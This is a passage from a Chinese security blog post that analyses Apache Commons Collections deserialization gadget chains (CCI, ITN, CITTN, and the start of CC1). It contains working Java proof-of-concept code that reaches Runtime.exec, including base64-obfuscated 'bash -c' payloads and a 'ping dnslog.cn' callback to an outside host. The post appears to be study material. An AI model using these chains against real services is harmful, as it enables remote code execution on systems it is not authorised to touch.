&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>可以看到有两个构造函数，当传入有参构造函数时，其成员<code>iParamTypes</code>和<code>iArgs</code>会被赋值，然后在其<code>transform</code>函数中，会依据成员<code>iParamTypes</code>和<code>iArgs</code>来生成实例化对象。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></div></figure>

<p>那么我们就可以借助该类的<code>transform</code>函数，来生成<code>TrAXFilter</code>类的实例化对象，从而在<code>TrAXFilter</code>的构造函数中，调用到<code>TemplatesImpl.newTransformer()</code>来加载字节码，完成任意函数调用。</p>

        <h1 id="经典链子CCI"   >
          <a href="#经典链子CCI" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子CCI" class="headerlink" title="经典链子CCI"></a>经典链子CCI</h1>
      <p><code>ChainedTransformer-&gt;ConstantTransformer-&gt;InvokerTransformer</code></p>
<p>为了方便，自己命名为<code>CCI</code></p>

        <h2 id="前置知识-2"   >
          <a href="#前置知识-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>可以使用<code>ChainedTransformer.transform()</code>来调用其中该数组中的各种<code>transformer</code>，从而获取<code>Runtime</code>来执行命令。举个简单的例子如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch abc&quot;</span>&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//随便设置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>调用时<code>ChainedTransformer.transfor()</code>满足如下条件即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121441271.png" alt="image-20220802121441271"></p>
<p>进入之后会一直循环调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121635026.png" alt="image-20220802121635026"></p>
<p>直到最后调用到<code>Runtime的exec</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802122031069.png" alt="image-20220802122031069"></p>

        <h2 id="实际使用"   >
          <a href="#实际使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2>
      <p>调用<code>transform</code>数组获取<code>runtime</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;ping dnslog.cn&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中一种触发方式,LazyMap.get()</span></span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"><span class="comment">//调用LazyMap.get方法</span></span><br><span class="line">TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br></pre></td></tr></table></div></figure>

<p>代表如下获取<code>Runtime</code>的链子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801101348788.png" alt="image-20220801101348788"></p>
<p>从<code>LazyMap.get()</code>开始</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>
<p>这里的<code>factory</code>为<code>ChainedTransformer</code>，其<code>transform</code>为一个数组</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802095635405.png" alt="image-20220802095635405"></p>
<p><code>key</code>为<code>123</code>可以随便设置，但是实际调试的时候不知道为什么进不去，应该是<code>p</code>神讲的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100443587.png" alt="image-20220802100443587"></p>
<p>所以导致运行到上述情况时，上层的<code>HashMap</code>中的key已经是一个进程了，所以有值了，导致调试无法进入。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100604384.png" alt="image-20220802100604384"></p>

        <h1 id="经典链子ITN"   >
          <a href="#经典链子ITN" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子ITN" class="headerlink" title="经典链子ITN"></a>经典链子ITN</h1>
      <p><code>InvokerTransformer-&gt;TemplatesImpl.newTransformer</code></p>
<p>同样为了方便自己命名为<code>ITN</code></p>

        <h2 id="前置知识-3"   >
          <a href="#前置知识-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>可使用<code>TemplatesImpl.newTransformer</code>来调用到<code>defineClass</code>加载字节码任意调用，给个简单的例子</p>
<p>多方参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/63/" >利用TemplatesImpl加载字节码 - (yang99.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://maxzed.top/2022/07/13/javadeserializelab%E5%AD%A6%E4%B9%A0%EF%BC%88jdk1-8-0_301%EF%BC%89/" >JavaDeserializeLab学习（jdk1.8.0_301） – maxzed</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,dG91Y2ggYWJj&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;bytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>设置的命令为<code>touch abc</code>。</p>
<p>调试如下，可以看到，满足<code>TemplatesImpl.newTransformer</code>调用时，存在<code>_name</code>，即可调用对应的<code>_bytecodes</code>的字节码。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802113412874.png" alt="image-20220802113412874"></p>

        <h2 id="实际使用-1"   >
          <a href="#实际使用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际使用-1" class="headerlink" title="实际使用"></a>实际使用</h2>
      
        <h3 id="JAVA版本限制"   >
          <a href="#JAVA版本限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA版本限制" class="headerlink" title="JAVA版本限制"></a>JAVA版本限制</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" >BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>也就是<code>Java 8u251</code>以后，<code>JAVA</code>里的<code>ClassLoader</code>被删除，但是官网的<code>JDK</code>里还是有的，所以跑上面的例子代码还是能跑通，但是如果实际环境中可能就不行了，这个不是很懂。</p>
<p>那么如果没有<code>ClassLoader</code>的话，也就不存在下面的加载字节码的方法了，具体原因是<code>newTransformer</code>函数内部会调用到<code>ClassLoader</code>来加载字节码，这个可以参考如下：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/63/" >利用TemplatesImpl加载字节码 - (yang99.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="解析"   >
          <a href="#解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析" class="headerlink" title="解析"></a>解析</h3>
      <p>该链子的使用方法参考我熊哥的博客：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://maxzed.top/2022/07/13/javadeserializelab%E5%AD%A6%E4%B9%A0%EF%BC%88jdk1-8-0_301%EF%BC%89/" >JavaDeserializeLab学习（jdk1.8.0_301） – maxzed</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>加载字节码，直接运行所需命令</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Li90ZXN0LnNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">TemplatesImpl tempIm = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setField(tempIm, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;asd&quot;</span>);</span><br><span class="line">setField(tempIm, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">setField(tempIm, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">InvokerTransformer invTransf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);</span><br><span class="line"><span class="comment">//调用Get方法</span></span><br><span class="line">TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,tempIm);</span><br></pre></td></tr></table></div></figure>

<p>代表如下运行字节码链子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802103631920.png" alt="image-20220802103631920"></p>
<p>也是从<code>LazyMap.get()</code>开始，这里调试时上一层<code>HashMap</code>中就没有<code>key</code>值了，所以可以进去</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105100090.png" alt="image-20220802105100090"></p>
<p>然后进入<code>transform</code>中，可以看到对应的要执行的命令字节码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105822797.png" alt="image-20220802105822797"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]</span><br></pre></td></tr></table></div></figure>

<p>对比一下在没有序列化时的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105946768.png" alt="image-20220802105946768"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]</span><br></pre></td></tr></table></div></figure>

<p>是完全一样的，那么就会调用到<code>newTransform</code>来调用相关字节码</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1535" >Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="经典链子CITTN"   >
          <a href="#经典链子CITTN" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子CITTN" class="headerlink" title="经典链子CITTN"></a>经典链子CITTN</h1>
      <p><code>ChainedTransformer-&gt;ConstantTransformer-&gt;InstantiateTransformer-&gt;TrAXFilter-&gt;TemplatesImpl</code></p>
<p>同样为了方便自己命名为<code>CITTN</code></p>

        <h2 id="测试链"   >
          <a href="#测试链" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试链" class="headerlink" title="测试链"></a>测试链</h2>
      <p>即结合之前提到的这几个类，也能想出相关的链子，相关测试如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;touch bbbb\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setField(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">        setField(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setField(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        chain.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-1"   >
          <a href="#解析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-1" class="headerlink" title="解析"></a>解析</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110014361.png" alt="image-20220806110014361"></p>
<p>首先自然还是<code>ChainedTransformer</code>中的数组调用<code>transform</code>函数，之后调用<code>ConstantTransformer</code>的<code>transform</code>函数，获取到<code>TrAXFilter</code>类后，再调用<code>InstantiateTransformer</code>的<code>transform</code>函数，其中会生成<code>TrAXFilter</code>的实例化对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806112255293.png" alt="image-20220806112255293"></p>
<p>随后即可进入<code>TrAXFilter</code>的构造函数，传入的<code>this.iArgs</code>即为实例化<code>InstantiateTransformer</code>时传入的<code>Templates</code>对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110523351.png" alt="image-20220806110523351"></p>
<p>然后就调用到利用反射为<code>Templates</code>对象准备的字节码<code>_bytecodes</code>，从而完成任意函数执行。</p>

        <h1 id="一、CC1"   >
          <a href="#一、CC1" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、CC1" class="headerlink" title="一、CC1"></a>一、CC1</h1>
      
        <h2 id="前置知识-4"   >
          <a href="#前置知识-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>主要是动态代理对象的知识</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/118811585445582" >Java安全漫谈 - 11.反序列化篇(5)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="InvocationHandler"   >
          <a href="#InvocationHandler" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvocationHandler" class="headerlink" title="InvocationHandler"></a>InvocationHandler</h3>
      <p>有一个和<code>Transformer</code>接口很像的类<code>InvocationHandler</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当该代理对象调用任意方法时，都会被替换为调用之前传入的实现了<code>InvocationHandler</code>类下重写的<code>invoke</code>方法，以下是个简单的例子。</p>
